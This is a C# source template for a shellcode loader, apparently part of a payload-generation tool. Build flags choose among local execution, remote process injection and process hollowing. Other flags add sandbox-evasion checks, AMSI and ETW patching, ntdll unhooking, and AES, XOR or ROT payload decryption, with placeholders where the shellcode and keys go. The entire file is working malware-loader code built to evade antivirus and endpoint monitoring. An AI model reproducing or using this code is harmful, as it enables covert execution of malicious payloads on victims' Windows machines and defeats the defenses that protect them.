using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
#if AES
using System.Security.Cryptography;
#endif

namespace Craft
{
    public class Program
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;
        public const uint INFINITE = 0xFFFFFFF;        
#if RUN
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
#elif INJECT
        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
#elif HOLLOW
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0x0;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
#endif
#if SANDBOX
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        private static bool isSandbox()
        {
            if (Environment.ProcessorCount < 2)
            {
                return true;
            }
            if (Process.GetProcesses().Length < 50)
            {
                return true;
            }
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, COMMIT_RESERVE, 0x4, 0) == IntPtr.Zero)
            {
                return true;
            }
            if (FlsAlloc(IntPtr.Zero) == IntPtr.Zero)
            {
                return true;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5)
            {
                return true;
            }
            return false;
        }
#endif
#if BYPASS
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private static bool MemoryPatch(string dllname, string function, byte[] patch)
        {
            IntPtr address = GetProcAddress(GetModuleHandle(dllname), function);
            if (address == IntPtr.Zero)
            {
                return false;
            }
            uint oldProtect;
            bool success = VirtualProtect(address, (UIntPtr)patch.Length, EXECUTEREADWRITE, out oldProtect);
            if (!success)
            {
                return false;
            }
            Marshal.Copy(patch, 0, address, patch.Length);
            VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            return true;
        }
#endif
#if BYPASS || UNHOOK
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
#endif
#if SANDBOX || UNHOOK
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
#endif
#if UNHOOK
        [DllImport("psapi.dll", SetLastError = true)]
        public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, PageProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);

        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
        public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
        
        public const uint GENERIC_READ = 0x80000000;
        public const uint OPEN_EXISTING = 3;
        public const uint FILE_SHARE_READ = 0x00000001;

        public enum FileMapAccessType : uint
        {
            Read = 0x04
        }

        [Flags]
        public enum PageProtection : uint
        {
            Readonly = 0x02,
            SectionImage = 0x1000000,
        }

        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)] public UInt32 VirtualSize;
            [FieldOffset(12)] public UInt32 VirtualAddress;
            [FieldOffset(16)] public UInt32 SizeOfRawData;
            [FieldOffset(20)] public UInt32 PointerToRawData;
            [FieldOffset(24)] public UInt32 PointerToRelocations;
            [FieldOffset(28)] public UInt32 PointerToLinenumbers;
            [FieldOffset(32)] public UInt16 NumberOfRelocations;
            [FieldOffset(34)] public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)] public UInt32 Characteristics;

            public string Section
            {

                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic; // Magic number

            public UInt16 e_cblp; // Bytes on last page of file
            public UInt16 e_cp; // Pages in file
            public UInt16 e_crlc; // Relocations
            public UInt16 e_cparhdr; // Size of header in paragraphs
            public UInt16 e_minalloc; // Minimum extra paragraphs needed
            public UInt16 e_maxalloc; // Maximum extra paragraphs needed
            public UInt16 e_ss; // Initial (relative) SS value
            public UInt16 e_sp; // Initial SP value
            public UInt16 e_csum; // Checksum
            public UInt16 e_ip; // Initial IP value
            public UInt16 e_cs; // Initial (relative) CS value
            public UInt16 e_lfarlc; // File address of relocation table
            public UInt16 e_ovno; // Overlay number

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1; // Reserved words

            public UInt16 e_oemid; // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo; // OEM information; e_oemid specific

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2; // Reserved words

            public Int32 e_lfanew; // File address of new exe header

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == "MZ"; }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)] public UInt32 Signature;
            [FieldOffset(4)] public IMAGE_FILE_HEADER FileHeader;
            [FieldOffset(24)] public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)] public MagicType Magic;
            [FieldOffset(2)] public byte MajorLinkerVersion;
            [FieldOffset(3)] public byte MinorLinkerVersion;
            [FieldOffset(4)] public uint SizeOfCode;
            [FieldOffset(8)] public uint SizeOfInitializedData;
            [FieldOffset(12)] public uint SizeOfUninitializedData;
            [FieldOffset(16)] public uint AddressOfEntryPoint;
            [FieldOffset(20)] public uint BaseOfCode;
            [FieldOffset(24)] public ulong ImageBase;
            [FieldOffset(32)] public uint SectionAlignment;
            [FieldOffset(36)] public uint FileAlignment;
            [FieldOffset(40)] public ushort MajorOperatingSystemVersion;
            [FieldOffset(42)] public ushort MinorOperatingSystemVersion;
            [FieldOffset(44)] public ushort MajorImageVersion;
            [FieldOffset(46)] public ushort MinorImageVersion;
            [FieldOffset(48)] public ushort MajorSubsystemVersion;
            [FieldOffset(50)] public ushort MinorSubsystemVersion;
            [FieldOffset(52)] public uint Win32VersionValue;
            [FieldOffset(56)] public uint SizeOfImage;
            [FieldOffset(60)] public uint SizeOfHeaders;
            [FieldOffset(64)] public uint CheckSum;
            [FieldOffset(68)] public SubSystemType Subsystem;
            [FieldOffset(70)] public DllCharacteristicsType DllCharacteristics;
            [FieldOffset(72)] public ulong SizeOfStackReserve;
            [FieldOffset(80)] public ulong SizeOfStackCommit;
            [FieldOffset(88)] public ulong SizeOfHeapReserve;
            [FieldOffset(96)] public ulong SizeOfHeapCommit;
            [FieldOffset(104)] public uint LoaderFlags;
            [FieldOffset(108)] public uint NumberOfRvaAndSizes;
            [FieldOffset(112)] public IMAGE_DATA_DIRECTORY ExportTable;
            [FieldOffset(120)] public IMAGE_DATA_DIRECTORY ImportTable;
            [FieldOffset(128)] public IMAGE_DATA_DIRECTORY ResourceTable;
            [FieldOffset(136)] public IMAGE_DATA_DIRECTORY ExceptionTable;
            [FieldOffset(144)] public IMAGE_DATA_DIRECTORY CertificateTable;
            [FieldOffset(152)] public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            [FieldOffset(160)] public IMAGE_DATA_DIRECTORY Debug;
            [FieldOffset(168)] public IMAGE_DATA_DIRECTORY Architecture;
            [FieldOffset(176)] public IMAGE_DATA_DIRECTORY GlobalPtr;
            [FieldOffset(184)] public IMAGE_DATA_DIRECTORY TLSTable;
            [FieldOffset(192)] public IMAGE_DATA_DIRECTORY LoadConfigTable;
            [FieldOffset(200)] public IMAGE_DATA_DIRECTORY BoundImport;
            [FieldOffset(208)] public IMAGE_DATA_DIRECTORY IAT;
            [FieldOffset(216)] public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            [FieldOffset(224)] public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            [FieldOffset(232)] public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }

        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }

        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }
        
        private static bool Unhook()
        {
            IntPtr currentProcessHandle = GetCurrentProcess();
            MODULEINFO modInfo = new MODULEINFO();
            IntPtr dllHandle = GetModuleHandle("ntdll.dll");
            GetModuleInformation(currentProcessHandle, dllHandle, out modInfo, (uint)Marshal.SizeOf(modInfo));
            IntPtr dllBase = modInfo.lpBaseOfDll;
            string ntdll = "C:\\Windows\\System32\\ntdll.dll";
            IntPtr ntdllHandle = CreateFileA(ntdll, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            IntPtr ntdllMapping = CreateFileMapping(ntdllHandle, IntPtr.Zero, PageProtection.Readonly | PageProtection.SectionImage, 0, 0, null);
            IntPtr ntdllMmapped = MapViewOfFile(ntdllMapping, FileMapAccessType.Read, 0, 0, IntPtr.Zero);

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
            IntPtr ptrtoNTHeader = (dllBase + dosHeader.e_lfanew);
            IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrtoNTHeader, typeof(IMAGE_NT_HEADERS64));
            try
            {
                for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++)
                {
                    IntPtr ptrtoSectionHeader = (ptrtoNTHeader + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
                    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrtoSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
                    string sectionName = new string(sectionHeader.Name);

                    if (sectionName.Contains(".text"))
                    {
                        uint oldProtect = 0;
                        IntPtr oldAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
                        IntPtr newAddress = IntPtr.Add(ntdllMmapped, (int)sectionHeader.VirtualAddress);
                        bool success = VirtualProtect(oldAddress, (UIntPtr)sectionHeader.VirtualSize, EXECUTEREADWRITE, out oldProtect);
                        if (success)
                        {
                            CopyMemory(oldAddress, newAddress, sectionHeader.VirtualSize);
                            success = VirtualProtect(oldAddress, (UIntPtr)sectionHeader.VirtualSize, oldProtect, out oldProtect);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                return false;
            }
            return true;
        }

#endif
        public static void Main()
        {

#if SANDBOX
            if (isSandbox())
            {
                return;
            }
#endif
#if UNHOOK
            Unhook();
#endif
#if BYPASS
            MemoryPatch("amsi.dll", "AmsiScanBuffer", new byte[] { 0x31, 0xff, 0x90 });
            MemoryPatch("ntdll.dll", "EtwEventWrite", new byte[] { 0xC3 });
#endif
            byte[] buf = new byte[] {{SHELLCODE}};
#if AES
            byte[] key = new byte[] {{KEY}};
            byte[] iv = new byte[] {{IV}};

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV  = iv;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    buf = decryptor.TransformFinalBlock(buf, 0, buf.Length);
                }
            }
#elif XOR
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ {{KEY}});
            }
#elif ROT
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - {{KEY}}) & 0xFF);
            }            
#endif
#if RUN
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, INFINITE);
#elif INJECT
            int pid = -1;
            foreach (var proc in Process.GetProcessesByName("{{PROCESS}}"))
            {
                bool isWow64;
                if (IsWow64Process(proc.Handle, out isWow64) && isWow64 == {{ISWOW64}})
                {
                    pid = proc.Id;
                    break;
                }
            }
            if (pid == -1) {
                return;
            }
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
#elif HOLLOW
            bool isWow64 = {{ISWOW64}};
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "{{PROCESS}}", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = isWow64 ? (IntPtr)((Int32)pbInfo.PebAddress + 0x08) : (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x400];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = isWow64 ? (IntPtr)BitConverter.ToInt32(procAddr, 0) : (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3C);
            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            uint rResult = ResumeThread(pInfo.hThread);
#endif
        }
    }
}